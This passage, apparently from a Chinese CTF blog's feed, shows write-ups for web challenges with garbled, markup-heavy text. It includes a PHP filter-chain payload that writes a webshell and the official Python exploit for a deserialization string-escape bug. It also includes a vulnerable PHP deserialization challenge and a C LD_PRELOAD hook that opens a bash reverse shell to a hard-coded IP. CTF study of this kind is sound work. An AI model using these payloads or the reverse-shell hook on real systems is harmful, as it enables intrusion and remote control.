operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Ddata<span class="token operator">%</span><span class="token number">3</span>Atext<span class="token operator">%</span><span class="token number">2</span>Fplain<span class="token operator">%</span><span class="token number">3</span>Bbase64<span class="token operator">%</span><span class="token number">2</span>Ce3vXt<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>BNiQhbQP<span class="token operator">%</span><span class="token number">2</span>F7lrUWoS9fXVFgvvf6evI0B5ZzZjMMksp1mmoLZJsnJLRc8bD5KRN5v3f13Z8rs6<span class="token operator">%</span><span class="token number">2</span>BabGViwAsMWlMtH2ltX33FcPX2G9m6xd0pzfg1MPgkRfbtOPVWq<span class="token operator">%</span><span class="token number">2</span>FTMK91vUafvKN1UIKBjcsQ05XVFu71kN1d1771mtN3DjIOAFU<span class="token operator">%</span><span class="token number">2</span>F35RROrZpqlbb1m<span class="token operator">%</span><span class="token number">2</span>FmB74Wr62Vqfvwou<span class="token operator">%</span><span class="token number">2</span>F16k<span class="token operator">%</span><span class="token number">2</span>F2nH7X10d<span class="token operator">%</span><span class="token number">2</span>Buf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fymlyz1ev<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">2</span>FZez3q5Ag44Mf<span class="token operator">%</span><span class="token number">2</span>B6isvnqZKp565pvvt<span class="token operator">%</span><span class="token number">2</span>B6780vrq29NTwebsvWYX9<span class="token operator">%</span><span class="token number">2</span>Brfj037bf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fq9S7N<span class="token operator">%</span><span class="token number">2</span>B9<span class="token operator">%</span><span class="token number">2</span>FjPzJ7Tz4jft<span class="token operator">%</span><span class="token number">2</span>F6u<span class="token operator">%</span><span class="token number">2</span>Fx16xPvsuvF59wv15is3zWm<span class="token operator">%</span><span class="token number">2</span>FXf<span class="token operator">%</span><span class="token number">2</span>F36srN<span class="token operator">%</span><span class="token number">2</span>Fz5WPU9<span class="token operator">%</span><span class="token number">2</span>Bi770<span class="token operator">%</span><span class="token number">2</span>FX<span class="token operator">%</span><span class="token number">2</span>Fb<span class="token operator">%</span><span class="token number">2</span>FCLzf<span class="token operator">%</span><span class="token number">2</span>F2<span class="token operator">%</span><span class="token number">2</span>FHPv14<span class="token operator">%</span><span class="token number">2</span>Ft9u79<span class="token operator">%</span><span class="token number">2</span>B3356Ubvm2f8jxi<span class="token operator">%</span><span class="token number">2</span>Fu9d<span class="token operator">%</span><span class="token number">2</span>F3ZanJ<span class="token operator">%</span><span class="token number">2</span>Bw<span class="token operator">%</span><span class="token number">2</span>FNa347<span class="token operator">%</span><span class="token number">2</span>B3PivdX3<span class="token operator">%</span><span class="token number">2</span>Fv<span class="token operator">%</span><span class="token number">2</span>Ffvff9fON7N<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>FPNe7N6m3Wmt<span class="token operator">%</span><span class="token number">2</span>Buqv<span class="token operator">%</span><span class="token number">2</span>F1<span class="token operator">%</span><span class="token number">2</span>Fm73vy9e<span class="token operator">%</span><span class="token number">2</span>Fl<span class="token operator">%</span><span class="token number">2</span>BKr9vV93vOn8qV<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>FdyFUm0fr3c8ec6L33UJUqc3HQ19FfpqxlWp1LT9fz8Vq9xmxq<span class="token operator">%</span><span class="token number">2</span>Bl4aGNUvLZjLXHxVKFJn6RH1U8qnhUMZ0VJ1R5rzW8<span class="token operator">%</span><span class="token number">2</span>FFjvceb8xTqBSjfZCJRpl6OzemfKlUv6<span class="token operator">%</span><span class="token number">2</span>F5ZJ7RQ6aUZA<span class="token operator">%</span><span class="token number">2</span>BYx7Qdlnvuw4XXHruYb3FI9tjPiVH9gybdfR0Kwa3<span class="token operator">%</span><span class="token number">2</span>B1<span class="token operator">%</span><span class="token number">2</span>FJ22XfupcE77v<span class="token operator">%</span><span class="token number">2</span>F7Pr8706OW4T0JkQ5X33kZbpvmW361YG2kW43OAj5JGoV2LhKz<span class="token operator">%</span><span class="token number">2</span>Ba3v3m3fvpoNKjcgA<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121700296.png" alt="image-20240707121700296"></p><p>æˆåŠŸå†™å…¥shell.phpï¼Œæ¥ä¸‹æ¥ç”¨åŒæ ·çš„æ–¹å¼å†™é©¬å³å¯ï¼ˆæ³¨æ„åæ–œæ è½¬ä¹‰<code>$</code>ï¼‰</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125336463.png" alt="image-20240707125336463"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125857528.png" alt="image-20240707125857528"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125509231.png" alt="image-20240707125509231"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125456189.png" alt="image-20240707125456189"></p><p>å®˜æ–¹çš„expï¼Œå¤„ç†å­—ç¬¦ä¸²é€ƒé€¸çš„éƒ¨åˆ†å†™å¾—æ¯”æˆ‘å¥½ï¼ˆ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.    """</span>    payload_file <span class="token operator">=</span> <span class="token string">'O:9:"read_file":2:&#123;s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':"'</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">'";&#125;'</span>    payload <span class="token operator">=</span> <span class="token string">"%9f"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_file<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2b"</span><span class="token punctuation">)</span>    filename_len <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> self<span class="token punctuation">.</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"?start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename_len<span class="token punctuation">&#125;</span></span><span class="token string">&amp;read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns the contents of a remote file.    """</span>    path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="NewerFileDetectorï¼ˆUnsolvedï¼‰"><a href="#NewerFileDetectorï¼ˆUnsolvedï¼‰" class="headerlink" title="NewerFileDetectorï¼ˆUnsolvedï¼‰"></a>NewerFileDetectorï¼ˆUnsolvedï¼‰</h2><blockquote><p>xss</p></blockquote><hr><h2 id="SendMessageï¼ˆUnsolvedï¼‰"><a href="#SendMessageï¼ˆUnsolvedï¼‰" class="headerlink" title="SendMessageï¼ˆUnsolvedï¼‰"></a>SendMessageï¼ˆUnsolvedï¼‰</h2><p>phpåœ¨å¤„ç†å…±äº«å†…å­˜è·¨è¿›ç¨‹é€šè®¯æ—¶ï¼Œå¦‚æœå†…å­˜é‡Œé¢çš„å†…å®¹å¯æ§ï¼Œä¼šç›´æ¥è§¦å‘ååºåˆ—åŒ–æ“ä½œ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;webå’Œpwnæœ€åˆ†ä¸å¼€çš„ä¸€é›†&lt;/p&gt;
&lt;p&gt;å®˜æ–¹wpï¼š&lt;a href=&quot;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&quot;&gt;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è‰ï¼Œä¸€ä¸ªæœ€æ–°æœ€çƒ­cveåˆ†åˆ«å‡ºäº†ä¸€ä¸ªwebé¢˜å’Œä¸€ä¸ªpwné¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="RCE" scheme="http://c1oudfl0w0.github.io/blog/tags/RCE/"/>
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="PHP" scheme="http://c1oudfl0w0.github.io/blog/tags/PHP/"/>
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
    <category term="ThinkPHP" scheme="http://c1oudfl0w0.github.io/blog/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>2024æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å¤å­£èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/</id>
    <published>2024-07-05T15:22:54.000Z</published>
    <updated>2024-07-16T16:45:09.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ªäººåç§°ï¼šé›²æµ</p><p>ä¸ªäººæ’åï¼š68</p><p>ç­¾åˆ°é¢˜éƒ½åšä¸æ¥æœ‰ç‚¹éš¾ç»·</p><p>å‚è€ƒï¼š</p><p>ç¬¬ä¸€åçš„wpï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247486883&idx=1&sn=4a99836ee029141df32979be33b0a663">https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247486883&amp;idx=1&amp;sn=4a99836ee029141df32979be33b0a663</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><blockquote><p>ååºåˆ—åŒ– + ld_preloadåŠ«æŒ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\)'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No injecting!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span>=<span class="token interpolation"><span class="token variable">$value</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat hints.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You are stupid, what exactly is your identity?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker"</span><span class="token operator">==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker is bad guy!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function_name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.[^.]*$/'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token punctuation">;</span>            <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶æˆåŠŸç§»åŠ¨åˆ°$&#123;destination&#125;"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"éæ³•æ–‡ä»¶åã€‚"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Harder'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼ld_preload</p><p>ç¨å¾®å®¡è®¡ä¸€ä¸‹ï¼Œç»™äº†ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯åŠ«æŒ<code>cat</code>å‘½ä»¤</p><p>ä¸Šä¼ æ–‡ä»¶çš„é“¾å­ï¼š<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FUN::__get -&gt; FILE::__call</code></p><p>å‡†å¤‡ä¸€ä¸‹soæ–‡ä»¶</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240705235511829.png" alt="image-20240705235511829"></p><p>åŠ«æŒstrncmpå³å¯</p><p>hook_strncmp.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">,</span> <span class="token class-name">size_t</span> __n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// è¿™é‡Œå‡½æ•°çš„å®šä¹‰å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œç¡®å®š</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 